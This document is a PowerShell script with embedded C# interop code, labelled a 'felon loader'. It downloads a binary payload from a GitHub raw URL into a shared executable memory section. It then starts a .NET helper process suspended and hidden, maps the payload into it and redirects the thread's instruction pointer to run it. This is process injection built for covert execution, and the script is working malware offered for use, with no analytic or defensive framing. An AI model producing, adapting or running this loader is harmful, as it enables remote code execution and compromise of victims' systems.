& 'Write-Host' '[*] felon loader (aligned context hijack)'

$coreSrc = @'
using System;
using System.Text;
using System.Runtime.InteropServices;

public class Core6 {
    [DllImport("winhttp.dll", CharSet=CharSet.Unicode)]
    public static extern IntPtr WinHttpOpen(string a, uint t, string p, string b, uint f);
    [DllImport("winhttp.dll", CharSet=CharSet.Unicode)]
    public static extern IntPtr WinHttpConnect(IntPtr s, string host, ushort port, uint r);
    [DllImport("winhttp.dll", CharSet=CharSet.Unicode)]
    public static extern IntPtr WinHttpOpenRequest(IntPtr c, string v, string path, string ver, string rf, IntPtr t, uint f);
    [DllImport("winhttp.dll")]
    public static extern bool WinHttpSendRequest(IntPtr r, IntPtr h, uint hl, IntPtr b, uint bl, uint tl, IntPtr c);
    [DllImport("winhttp.dll")]
    public static extern bool WinHttpReceiveResponse(IntPtr r, IntPtr res);
    [DllImport("winhttp.dll")]
    public static extern bool WinHttpQueryDataAvailable(IntPtr r, out uint bytes);
    [DllImport("winhttp.dll")]
    public static extern bool WinHttpReadData(IntPtr r, IntPtr buf, uint toRead, out uint read);
    [DllImport("winhttp.dll")]
    public static extern bool WinHttpCloseHandle(IntPtr h);

    [DllImport("ntdll.dll")]
    public static extern int NtCreateSection(
        out IntPtr section, uint access, IntPtr attr,
        ref long maxSize, uint pageProtect, uint alloc, IntPtr file);

    [DllImport("ntdll.dll")]
    public static extern int NtMapViewOfSection(
        IntPtr section, IntPtr process, ref IntPtr baseAddr,
        UIntPtr zeroBits, UIntPtr commitSize, IntPtr offset,
        ref uint viewSize, uint inheritDisp, uint allocType, uint protect);

    [DllImport("ntdll.dll")]
    public static extern int NtUnmapViewOfSection(IntPtr process, IntPtr baseAddr);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern bool CreateProcess(
        string a, StringBuilder b, IntPtr c, IntPtr d,
        bool e, uint f, IntPtr g, string h,
        ref SI si, out PI pi);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualFree(IntPtr a, uint s, uint t);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool GetThreadContext(IntPtr t, IntPtr ctx);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool SetThreadContext(IntPtr t, IntPtr ctx);

    [DllImport("kernel32.dll")] public static extern uint ResumeThread(IntPtr t);
    [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr h, uint ms);
    [DllImport("kernel32.dll")] public static extern uint GetLastError();

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Auto)]
    public struct SI {
        public uint cb; public string r1,r2,r3;
        public uint x,y,xs,ys,xc,yc,fa,fl;
        public short sw,r4; public IntPtr r5,i,o,e;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PI { public IntPtr hp,ht; public int pid,tid; }

    public const uint CREATE_SUSPENDED = 0x00000004;
    public const uint CREATE_NO_WINDOW = 0x08000000;
    public const uint CONTEXT_FLAGS    = 0x00100007;
    public const uint CONTEXT_SIZE     = 2048;
    public const int  RIP_OFFSET       = 0x00F8;
}
'@
Add-Type -TypeDefinition $coreSrc

# create section 8MB
$preallocSize = [long](8 * 1024 * 1024)
$sh = [IntPtr]::Zero
$ntSt = [Core6]::NtCreateSection(
    [ref]$sh, 0x0F001F, [IntPtr]::Zero,
    [ref]$preallocSize, 0x40, 0x08000000, [IntPtr]::Zero
)
& 'Write-Host' ('[+] NtCreateSection: 0x' + $ntSt.ToString('X') + ' handle: ' + $sh)
if ($sh -eq [IntPtr]::Zero) { & 'Write-Host' '[-] Section failed.'; exit }

# map local RW
$lb  = [IntPtr]::Zero
$vs1 = [uint32]$preallocSize
[Core6]::NtMapViewOfSection($sh, [Core6]::GetCurrentProcess(), [ref]$lb, [UIntPtr]::Zero, [UIntPtr]::Zero, [IntPtr]::Zero, [ref]$vs1, 2, 0, 0x04) | Out-Null
& 'Write-Host' ('[+] Local map: 0x' + $lb.ToString('X'))
if ($lb -eq [IntPtr]::Zero) { & 'Write-Host' '[-] Local map failed.'; exit }

# download directly into section — heap never touched
& 'Write-Host' '[*] Downloading into section...'
$sess = [Core6]::WinHttpOpen('Mozilla/5.0', 1, $null, $null, 0)
$conn = [Core6]::WinHttpConnect($sess, 'raw.githubusercontent.com', [uint16]443, 0)
$req  = [Core6]::WinHttpOpenRequest($conn, 'GET', '/i25968627-ui/crispy-spoon/refs/heads/main/nfasiv.bin', $null, $null, [IntPtr]::Zero, 0x00800000)
[Core6]::WinHttpSendRequest($req, [IntPtr]::Zero, 0, [IntPtr]::Zero, 0, 0, [IntPtr]::Zero) | Out-Null
[Core6]::WinHttpReceiveResponse($req, [IntPtr]::Zero) | Out-Null

$writePtr  = $lb
$totalRead = [uint32]0
while ($true) {
    $avail = [uint32]0
    [Core6]::WinHttpQueryDataAvailable($req, [ref]$avail) | Out-Null
    if ($avail -eq 0) { break }
    $read = [uint32]0
    [Core6]::WinHttpReadData($req, $writePtr, $avail, [ref]$read) | Out-Null
    $writePtr  = [IntPtr]($writePtr.ToInt64() + $read)
    $totalRead += $read
}
[Core6]::WinHttpCloseHandle($req)  | Out-Null
[Core6]::WinHttpCloseHandle($conn) | Out-Null
[Core6]::WinHttpCloseHandle($sess) | Out-Null
& 'Write-Host' ('[+] Downloaded: ' + $totalRead + ' bytes.')
if ($totalRead -lt 100) { & 'Write-Host' '[-] Too small.'; exit }

[Core6]::NtUnmapViewOfSection([Core6]::GetCurrentProcess(), $lb) | Out-Null
& 'Write-Host' '[+] Local view unmapped.'

# spawn notepad suspended
$notepadPath = 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\AddInProcess32.exe'
$si  = New-Object Core6+SI
$si.cb = [uint32][System.Runtime.InteropServices.Marshal]::SizeOf($si)
$pi  = New-Object Core6+PI
$cmd = New-Object System.Text.StringBuilder(1024)
$cmd.Append('"' + $notepadPath + '"') | Out-Null

& 'Write-Host' '[*] Spawning notepad suspended...'
$ok = [Core6]::CreateProcess(
    $notepadPath, $cmd,
    [IntPtr]::Zero, [IntPtr]::Zero, $false,
    ([Core6]::CREATE_SUSPENDED -bor [Core6]::CREATE_NO_WINDOW),
    [IntPtr]::Zero, 'C:\Windows\System32',
    [ref]$si, [ref]$pi
)
if (-not $ok) { & 'Write-Host' ('[-] Spawn failed: ' + [Core6]::GetLastError()); exit }
& 'Write-Host' ('[+] PID: ' + $pi.pid + ' TID: ' + $pi.tid)

# map remote RWX
$rb  = [IntPtr]::Zero
$vs2 = [uint32]$preallocSize
[Core6]::NtMapViewOfSection($sh, $pi.hp, [ref]$rb, [UIntPtr]::Zero, [UIntPtr]::Zero, [IntPtr]::Zero, [ref]$vs2, 2, 0, 0x40) | Out-Null
& 'Write-Host' ('[+] Remote map: 0x' + $rb.ToString('X'))
if ($rb -eq [IntPtr]::Zero) { & 'Write-Host' '[-] Remote map failed.'; exit }

# VirtualAlloc aligned CONTEXT buffer — page-aligned satisfies x64 16-byte requirement
$ctxBuf = [Core6]::VirtualAlloc([IntPtr]::Zero, [Core6]::CONTEXT_SIZE, 0x3000, 0x04)
& 'Write-Host' ('[+] CONTEXT buffer: 0x' + $ctxBuf.ToString('X'))
if ($ctxBuf -eq [IntPtr]::Zero) { & 'Write-Host' '[-] VirtualAlloc failed.'; exit }

# zero buffer
for ($i = 0; $i -lt [Core6]::CONTEXT_SIZE; $i++) {
    [System.Runtime.InteropServices.Marshal]::WriteByte($ctxBuf, $i, 0)
}

# ContextFlags at offset 0x30
[System.Runtime.InteropServices.Marshal]::WriteInt32($ctxBuf, 0x30, [int][Core6]::CONTEXT_FLAGS)

$gtOk = [Core6]::GetThreadContext($pi.ht, $ctxBuf)
& 'Write-Host' ('[+] GetThreadContext: ' + $gtOk + ' LastError: ' + [Core6]::GetLastError())
if (-not $gtOk) { & 'Write-Host' '[-] GetThreadContext failed.'; exit }

$origRip = [System.Runtime.InteropServices.Marshal]::ReadInt64($ctxBuf, [Core6]::RIP_OFFSET)
& 'Write-Host' ('[+] Original RIP: 0x' + $origRip.ToString('X'))

[System.Runtime.InteropServices.Marshal]::WriteInt64($ctxBuf, [Core6]::RIP_OFFSET, $rb.ToInt64())

$stOk = [Core6]::SetThreadContext($pi.ht, $ctxBuf)
& 'Write-Host' ('[+] RIP hijacked to: 0x' + $rb.ToInt64().ToString('X') + ' ok: ' + $stOk)
if (-not $stOk) { & 'Write-Host' '[-] SetThreadContext failed.'; exit }

[Core6]::VirtualFree($ctxBuf, 0, 0x8000) | Out-Null

& 'Write-Host' '[*] Resuming...'
[Core6]::ResumeThread($pi.ht) | Out-Null
[Core6]::WaitForSingleObject($pi.hp, [uint32]::MaxValue) | Out-Null
& 'Write-Host' '[+] Done.'